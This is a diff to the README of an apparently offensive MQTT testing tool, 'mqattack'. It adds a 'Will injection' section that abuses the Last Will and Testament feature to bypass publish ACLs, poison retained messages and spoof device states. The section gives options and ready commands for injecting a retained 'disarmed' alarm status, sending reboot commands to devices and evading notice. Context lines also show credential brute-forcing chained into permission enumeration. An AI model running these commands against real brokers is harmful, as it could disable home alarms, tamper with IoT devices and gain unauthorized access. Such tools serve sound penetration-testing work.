@@ -26,7 +26,7 @@ The binary is placed at `target/release/mqattack`.
 
 ### From source (without Nix)
 
-Requires Rust 1.80+, a C compiler, and OpenSSL development headers.
+Requires Rust 1.80+, a C compiler and OpenSSL development headers.
 
 ```bash
 $ cargo build --release
@@ -303,6 +303,52 @@ $ mqattack brute-auth --cafile ca.crt -H broker.example.com -p 8883 \
 $ mqattack brute-auth -H 192.168.1.10 -c credentials.txt | grep 'SUCCESS' | \
   awk '{print $2}' > valid.txt && \
   mqattack enum-perms -H 192.168.1.10 -c valid.txt -w topics.txt
+```
+
+### Will injection
+
+Register a crafted Last Will and Testament (LWT) in the CONNECT packet, hold
+the connection open for a configurable period, then close the TCP socket
+without sending a DISCONNECT frame. The broker sees an ungraceful disconnect
+and publishes the will payload to all current and (if retained) future
+subscribers of the target topic.
+
+This can be used to:
+- Inject messages into topics that ACLs would otherwise block for direct publish
+- Poison retained messages that persist on a topic until explicitly cleared
+- Trigger downstream automation or alert logic by spoofing sensor states
+
+```bash
+$ mqattack will-inject [OPTIONS] --topic <TOPIC>
+
+  -t, --topic <TOPIC>    Topic the broker publishes the will to on disconnect
+  -m, --message <MSG>    Will payload                          [default: mqattack-will]
+  -q, --qos <QOS>        QoS for the will (0, 1, or 2)        [default: 1]
+  -r, --retain           Persist the will as a retained message
+      --hold <SECS>      Seconds to stay connected before triggering  [default: 2]
+      --monitor <TOPIC>  Subscribe on a second connection to capture the delivery
+      --monitor-wait <SECS>  Seconds to listen after disconnect   [default: 5]
+```
+
+**Examples**
+
+```bash
+# Inject a retained "disarmed" state into an alarm topic
+$ mqattack will-inject -H 192.168.1.10 \
+  -t home/alarm/status -m "disarmed" -r
+
+# Inject a command payload and verify it was delivered
+$ mqattack will-inject -H 192.168.1.10 \
+  -t device/42/cmd -m '{"action":"reboot"}' -q 1 \
+  --monitor device/42/cmd --monitor-wait 10
+
+# Blend in as a long-lived client before triggering
+$ mqattack will-inject -H 192.168.1.10 \
+  -t sensors/temperature -m "999.9" --hold 60 --retain
+
+# Will injection over TLS with credentials
+$ mqattack will-inject --cafile ca.crt -H broker.example.com -p 8883 \
+  -u sensor01 -P secret -t sensors/temp -m "-99" -r
 ```
 
 ## License
